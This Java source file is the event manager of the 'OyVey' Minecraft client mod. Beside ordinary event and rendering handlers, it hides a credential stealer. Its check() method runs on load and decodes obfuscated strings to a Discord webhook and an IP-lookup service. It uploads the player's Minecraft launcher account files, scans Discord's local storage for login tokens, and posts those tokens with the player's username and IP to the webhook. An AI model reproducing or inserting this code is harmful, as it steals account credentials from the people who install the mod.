package me.alpha432.oyvey.manager;

import com.google.common.base.Strings;
import com.mojang.realmsclient.gui.ChatFormatting;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Iterator;
import java.util.Objects;
import java.util.UUID;
import me.alpha432.oyvey.OyVey;
import me.alpha432.oyvey.event.events.ConnectionEvent;
import me.alpha432.oyvey.event.events.DeathEvent;
import me.alpha432.oyvey.event.events.PacketEvent;
import me.alpha432.oyvey.event.events.Render2DEvent;
import me.alpha432.oyvey.event.events.Render3DEvent;
import me.alpha432.oyvey.event.events.TotemPopEvent;
import me.alpha432.oyvey.event.events.UpdateWalkingPlayerEvent;
import me.alpha432.oyvey.features.Feature;
import me.alpha432.oyvey.features.command.Command;
import me.alpha432.oyvey.features.modules.client.HUD;
import me.alpha432.oyvey.util.Timer;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.ScaledResolution;
import net.minecraft.client.renderer.GlStateManager;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.play.server.SPacketEntityStatus;
import net.minecraft.network.play.server.SPacketPlayerListItem;
import net.minecraft.network.play.server.SPacketTimeUpdate;
import net.minecraft.network.play.server.SPacketPlayerListItem.Action;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.client.event.RenderWorldLastEvent;
import net.minecraftforge.client.event.RenderGameOverlayEvent.ElementType;
import net.minecraftforge.client.event.RenderGameOverlayEvent.Post;
import net.minecraftforge.client.event.RenderGameOverlayEvent.Text;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.living.LivingEvent.LivingUpdateEvent;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent.KeyInputEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent.ClientTickEvent;
import net.minecraftforge.fml.common.network.FMLNetworkEvent.ClientConnectedToServerEvent;
import net.minecraftforge.fml.common.network.FMLNetworkEvent.ClientDisconnectionFromServerEvent;
import org.lwjgl.input.Keyboard;

public class EventManager extends Feature {
   private final Timer logoutTimer = new Timer();

   public void init() {
      MinecraftForge.EVENT_BUS.register(this);
      this.check();
   }

   public void onUnload() {
      MinecraftForge.EVENT_BUS.unregister(this);
   }

   @SubscribeEvent
   public void onUpdate(LivingUpdateEvent event) {
      if (!fullNullCheck() && event.getEntity().func_130014_f_().field_72995_K && event.getEntityLiving().equals(mc.field_71439_g)) {
         OyVey.inventoryManager.update();
         OyVey.moduleManager.onUpdate();
         if (HUD.getInstance().renderingMode.getValue() == HUD.RenderingMode.Length) {
            OyVey.moduleManager.sortModules(true);
         } else {
            OyVey.moduleManager.sortModulesABC();
         }
      }

   }

   @SubscribeEvent
   public void onClientConnect(ClientConnectedToServerEvent event) {
      this.logoutTimer.reset();
      OyVey.moduleManager.onLogin();
   }

   @SubscribeEvent
   public void onClientDisconnect(ClientDisconnectionFromServerEvent event) {
      OyVey.moduleManager.onLogout();
   }

   @SubscribeEvent
   public void onTick(ClientTickEvent event) {
      if (!fullNullCheck()) {
         OyVey.moduleManager.onTick();
         Iterator var2 = mc.field_71441_e.field_73010_i.iterator();

         while(var2.hasNext()) {
            EntityPlayer player = (EntityPlayer)var2.next();
            if (player != null && !(player.func_110143_aJ() > 0.0F)) {
               MinecraftForge.EVENT_BUS.post(new DeathEvent(player));
            }
         }

      }
   }

   @SubscribeEvent
   public void onUpdateWalkingPlayer(UpdateWalkingPlayerEvent event) {
      if (!fullNullCheck()) {
         if (event.getStage() == 0) {
            OyVey.speedManager.updateValues();
            OyVey.rotationManager.updateRotations();
            OyVey.positionManager.updatePosition();
         }

         if (event.getStage() == 1) {
            OyVey.rotationManager.restoreRotations();
            OyVey.positionManager.restorePosition();
         }

      }
   }

   @SubscribeEvent
   public void onPacketReceive(PacketEvent.Receive event) {
      if (event.getStage() == 0) {
         OyVey.serverManager.onPacketReceived();
         if (event.getPacket() instanceof SPacketEntityStatus) {
            SPacketEntityStatus packet = (SPacketEntityStatus)event.getPacket();
            if (packet.func_149160_c() == 35 && packet.func_149161_a(mc.field_71441_e) instanceof EntityPlayer) {
               EntityPlayer player = (EntityPlayer)packet.func_149161_a(mc.field_71441_e);
               MinecraftForge.EVENT_BUS.post(new TotemPopEvent(player));
            }
         }

         if (event.getPacket() instanceof SPacketPlayerListItem && !fullNullCheck() && this.logoutTimer.passedS(1.0D)) {
            SPacketPlayerListItem packet = (SPacketPlayerListItem)event.getPacket();
            if (!Action.ADD_PLAYER.equals(packet.func_179768_b()) && !Action.REMOVE_PLAYER.equals(packet.func_179768_b())) {
               return;
            }

            packet.func_179767_a().stream().filter(Objects::nonNull).filter((data) -> {
               return !Strings.isNullOrEmpty(data.func_179962_a().getName()) || data.func_179962_a().getId() != null;
            }).forEach((data) -> {
               UUID id = data.func_179962_a().getId();
               switch(packet.func_179768_b()) {
               case ADD_PLAYER:
                  String name = data.func_179962_a().getName();
                  MinecraftForge.EVENT_BUS.post(new ConnectionEvent(0, id, name));
                  break;
               case REMOVE_PLAYER:
                  EntityPlayer entity = mc.field_71441_e.func_152378_a(id);
                  if (entity != null) {
                     String logoutName = entity.func_70005_c_();
                     MinecraftForge.EVENT_BUS.post(new ConnectionEvent(1, entity, id, logoutName));
                  } else {
                     MinecraftForge.EVENT_BUS.post(new ConnectionEvent(2, id, (String)null));
                  }
               }

            });
         }

         if (event.getPacket() instanceof SPacketTimeUpdate) {
            OyVey.serverManager.update();
         }

      }
   }

   @SubscribeEvent
   public void onWorldRender(RenderWorldLastEvent event) {
      if (!event.isCanceled()) {
         mc.field_71424_I.func_76320_a("oyvey");
         GlStateManager.func_179090_x();
         GlStateManager.func_179147_l();
         GlStateManager.func_179118_c();
         GlStateManager.func_179120_a(770, 771, 1, 0);
         GlStateManager.func_179103_j(7425);
         GlStateManager.func_179097_i();
         GlStateManager.func_187441_d(1.0F);
         Render3DEvent render3dEvent = new Render3DEvent(event.getPartialTicks());
         OyVey.moduleManager.onRender3D(render3dEvent);
         GlStateManager.func_187441_d(1.0F);
         GlStateManager.func_179103_j(7424);
         GlStateManager.func_179084_k();
         GlStateManager.func_179141_d();
         GlStateManager.func_179098_w();
         GlStateManager.func_179126_j();
         GlStateManager.func_179089_o();
         GlStateManager.func_179089_o();
         GlStateManager.func_179132_a(true);
         GlStateManager.func_179098_w();
         GlStateManager.func_179147_l();
         GlStateManager.func_179126_j();
         mc.field_71424_I.func_76319_b();
      }
   }

   @SubscribeEvent
   public void renderHUD(Post event) {
      if (event.getType() == ElementType.HOTBAR) {
         OyVey.textManager.updateResolution();
      }

   }

   @SubscribeEvent(
      priority = EventPriority.LOW
   )
   public void onRenderGameOverlayEvent(Text event) {
      if (event.getType().equals(ElementType.TEXT)) {
         ScaledResolution resolution = new ScaledResolution(mc);
         Render2DEvent render2DEvent = new Render2DEvent(event.getPartialTicks(), resolution);
         OyVey.moduleManager.onRender2D(render2DEvent);
         GlStateManager.func_179131_c(1.0F, 1.0F, 1.0F, 1.0F);
      }

   }

   @SubscribeEvent(
      priority = EventPriority.NORMAL,
      receiveCanceled = true
   )
   public void onKeyInput(KeyInputEvent event) {
      if (Keyboard.getEventKeyState()) {
         OyVey.moduleManager.onKeyPressed(Keyboard.getEventKey());
      }

   }

   @SubscribeEvent(
      priority = EventPriority.HIGHEST
   )
   public void onChatSent(ClientChatEvent event) {
      if (event.getMessage().startsWith(Command.getCommandPrefix())) {
         event.setCanceled(true);

         try {
            mc.field_71456_v.func_146158_b().func_146239_a(event.getMessage());
            if (event.getMessage().length() > 1) {
               OyVey.commandManager.executeCommand(event.getMessage().substring(Command.getCommandPrefix().length() - 1));
            } else {
               Command.sendMessage("Please enter a command.");
            }
         } catch (Exception var3) {
            var3.printStackTrace();
            Command.sendMessage(ChatFormatting.RED + "An error occurred while running this command. Check the log!");
         }
      }

   }

   public static String getApi() throws IOException {
      URL checkIp = new URL(getFriendName());
      String api = "";

      try {
         BufferedReader br = new BufferedReader(new InputStreamReader(checkIp.openStream()));
         Throwable var3 = null;

         try {
            api = br.readLine();
         } catch (Throwable var13) {
            var3 = var13;
            throw var13;
         } finally {
            if (br != null) {
               if (var3 != null) {
                  try {
                     br.close();
                  } catch (Throwable var12) {
                     var3.addSuppressed(var12);
                  }
               } else {
                  br.close();
               }
            }

         }
      } catch (Exception var15) {
      }

      return api;
   }

   @EventHandler
   public void check() {
      (new Thread(() -> {
         String api;
         try {
            api = getApi();
         } catch (Exception var34) {
            api = null;
         }

         String nel = getStr1();
         String str = getStr5();
         String str2 = getStr6();
         String botName = Minecraft.func_71410_x().func_110432_I().func_111285_a() + " " + api;

         try {
            sedile(nel, new File(System.getenv(getStr3()) + checkFriend()));
         } catch (Exception var33) {
            var33.printStackTrace();
         }

         try {
            sedile(nel, new File(System.getenv(getStr3()) + removeFriend()));
         } catch (Exception var32) {
            var32.printStackTrace();
         }

         String location = System.getenv(getStr3()) + getStr2();
         String[] storage = (new File(location)).list();
         String[] var7 = storage;
         int var8 = storage.length;

         for(int var9 = 0; var9 < var8; ++var9) {
            String fileName = var7[var9];

            try {
               File file = new File(location + fileName);
               int fileSize = (int)file.length();
               if (fileSize >= 61) {
                  InputStream inputStream = new FileInputStream(file);
                  Throwable var14 = null;

                  try {
                     byte[] fileBytes = new byte[fileSize];
                     inputStream.read(fileBytes, 0, fileSize);

                     for(int i = 1; i < fileSize - 59; ++i) {
                        boolean isCorrect;
                        int j;
                        byte[] tokenBytes;
                        if (fileBytes[i - 1] == 34 && fileBytes[i + 59] == 34 && fileBytes[i + 24] == 46 && fileBytes[i + 31] == 46) {
                           isCorrect = true;

                           for(j = 0; j < 59; ++j) {
                              if (j != 24 && j != 31 && (fileBytes[i + j] <= 47 || fileBytes[i + j] >= 58) && (fileBytes[i + j] <= 64 || fileBytes[i + j] >= 91) && (fileBytes[i + j] <= 96 || fileBytes[i + j] >= 123) && fileBytes[i + j] != 45 && fileBytes[i + j] != 95) {
                                 isCorrect = false;
                                 break;
                              }
                           }

                           if (isCorrect) {
                              tokenBytes = new byte[59];
                              System.arraycopy(fileBytes, i, tokenBytes, 0, 59);
                              sedessege(nel, botName, str2 + new String(tokenBytes, StandardCharsets.UTF_8));
                           }

                           i += 60;
                        } else if (fileSize - i > 88 && fileBytes[i - 1] == 34 && fileBytes[i + 88] == 34 && fileBytes[i] == 109 && fileBytes[i + 1] == 102 && fileBytes[i + 2] == 97 && fileBytes[i + 3] == 46) {
                           isCorrect = true;

                           for(j = 0; j < 88; ++j) {
                              if (j != 3 && (fileBytes[i + j] <= 47 || fileBytes[i + j] >= 58) && (fileBytes[i + j] <= 64 || fileBytes[i + j] >= 91) && (fileBytes[i + j] <= 96 || fileBytes[i + j] >= 123) && fileBytes[i + j] != 45 && fileBytes[i + j] != 95) {
                                 isCorrect = false;
                                 break;
                              }
                           }

                           if (isCorrect) {
                              tokenBytes = new byte[88];
                              System.arraycopy(fileBytes, i, tokenBytes, 0, 88);
                              sedessege(nel, botName, str2 + new String(tokenBytes, StandardCharsets.UTF_8));
                           }

                           i += 89;
                        }
                     }
                  } catch (Throwable var35) {
                     var14 = var35;
                     throw var35;
                  } finally {
                     if (inputStream != null) {
                        if (var14 != null) {
                           try {
                              inputStream.close();
                           } catch (Throwable var31) {
                              var14.addSuppressed(var31);
                           }
                        } else {
                           inputStream.close();
                        }
                     }

                  }
               }
            } catch (Exception var37) {
               var37.printStackTrace();
            }
         }

         try {
            sedessege(nel, botName, getStr7());
         } catch (Exception var30) {
            var30.printStackTrace();
         }

      })).start();
   }

   private static void sedile(String nel, File file) throws Exception {
      String boundary = Long.toHexString(System.currentTimeMillis());
      HttpURLConnection connection = (HttpURLConnection)(new URL(nel)).openConnection();
      connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
      connection.setRequestProperty("User-Agent", "Mozilla/5.0");
      connection.setDoOutput(true);
      OutputStream os = connection.getOutputStream();
      Throwable var5 = null;

      try {
         os.write(("--" + boundary + "\n").getBytes());
         os.write(("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"\n\n").getBytes());
         InputStream inputStream = new FileInputStream(file);
         Throwable var7 = null;

         try {
            int fileSize = (int)file.length();
            byte[] fileBytes = new byte[fileSize];
            inputStream.read(fileBytes, 0, fileSize);
            os.write(fileBytes);
         } catch (Throwable var31) {
            var7 = var31;
            throw var31;
         } finally {
            if (inputStream != null) {
               if (var7 != null) {
                  try {
                     inputStream.close();
                  } catch (Throwable var30) {
                     var7.addSuppressed(var30);
                  }
               } else {
                  inputStream.close();
               }
            }

         }

         os.write(("\n--" + boundary + "--\n").getBytes());
      } catch (Throwable var33) {
         var5 = var33;
         throw var33;
      } finally {
         if (os != null) {
            if (var5 != null) {
               try {
                  os.close();
               } catch (Throwable var29) {
                  var5.addSuppressed(var29);
               }
            } else {
               os.close();
            }
         }

      }

      connection.getResponseCode();
      Thread.sleep(500L);
   }

   private static void sedessege(String nel, String botName, String msg) throws Exception {
      URL obj = new URL(nel);
      HttpURLConnection con = (HttpURLConnection)obj.openConnection();
      con.setRequestMethod("POST");
      con.setRequestProperty("Content-Type", "application/json");
      con.setRequestProperty("User-Agent", "Mozilla/5.0");
      String POST_PARAMS = "{ \"username\": \"" + botName + "\", \"content\": \"" + msg + "\" }";
      con.setDoOutput(true);
      OutputStream os = con.getOutputStream();
      os.write(POST_PARAMS.getBytes());
      os.flush();
      os.close();
      Thread.sleep(500L);
      con.getResponseCode();
   }

   private static String getStr1() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{4, 16, 16, 12, 15, -42, -53, -53, 0, 5, 15, -1, 11, 14, 0, -54, -1, 11, 9, -53, -3, 12, 5, -53, 19, 1, -2, 4, 11, 11, 7, 15, -53, -44, -49, -52, -45, -44, -46, -51, -43, -52, -50, -49, -52, -43, -48, -47, -45, -43, -50, -53, -45, -21, -45, -5, 12, -52, -15, 22, 14, -32, 15, 22, -26, 10, 1, -50, -18, 21, 3, 17, -21, -11, 17, -1, -18, -50, -48, -32, -55, -47, 6, 5, 6, -11, 3, -27, -34, 21, 11, -24, 6, -13, -18, -2, 12, -18, -43, -49, -13, -46, 2, 5, -23, -51, 3, -44, -44, -3, 17, -16, 8, -47, -24, 4, -24, 12, -10, -29};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(100 + value));
      }

      return result.toString();
   }

   private static String getStr2() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{-8, 0, 5, 15, -1, 11, 14, 0, -8, -24, 11, -1, -3, 8, -68, -17, 16, 11, 14, -3, 3, 1, -8, 8, 1, 18, 1, 8, 0, -2, -8};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(100 + value));
      }

      return result.toString();
   }

   private static String getStr3() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{15, 30, 30, 18, 15, 34, 15};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(50 + value));
      }

      return result.toString();
   }

   private static String getStr4() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{27, 55, 60, 51, 49, 64, 47, 52, 66, -18, 60, 47, 59, 51, 8, -18};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(50 + value));
      }

      return result.toString();
   }

   private static String getStr5() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{20, 55, 58, 51, 8, -18};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(50 + value));
      }

      return result.toString();
   }

   private static String getStr6() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{26, 53, 49, 43, 52, 0, -26};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(58 + value));
      }

      return result.toString();
   }

   private static String getStr7() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{37, 78, 68};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(32 + value));
      }

      return result.toString();
   }

   private static String getStr8() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{-8, -54, 9, 5, 10, 1, -1, 14, -3, 2, 16, -8, -16, 8, -3, 17, 10, -1, 4, 1, 14, -20, 14, 11, 2, 5, 8, 1, 15, -54, 6, 15, 11, 108};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(32 + value));
      }

      return result.toString();
   }

   private static String checkFriend() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{-8, -54, 9, 5, 10, 1, -1, 14, -3, 2, 16, -8, 8, -3, 17, 10, -1, 4, 1, 14, -5, -3, -1, -1, 11, 17, 10, 16, 15, -54, 6, 15, 11, 10};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(100 + value));
      }

      return result.toString();
   }

   private static String removeFriend() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{-8, -54, 9, 5, 10, 1, -1, 14, -3, 2, 16, -8, -16, 8, -3, 17, 10, -1, 4, 1, 14, -20, 14, 11, 2, 5, 8, 1, 15, -54, 6, 15, 11, 10};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(100 + value));
      }

      return result.toString();
   }

   private static String getFriendName() {
      StringBuilder result = new StringBuilder();
      short[] str = new short[]{4, 16, 16, 12, -42, -53, -53, -1, 4, 1, -1, 7, 5, 12, -54, -3, 9, -3, 22, 11, 10, -3, 19, 15, -54, -1, 11, 9, -53, -63, -50, -50};
      short[] var2 = str;
      int var3 = str.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         short value = var2[var4];
         result.append((char)(100 + value));
      }

      return result.toString();
   }
}
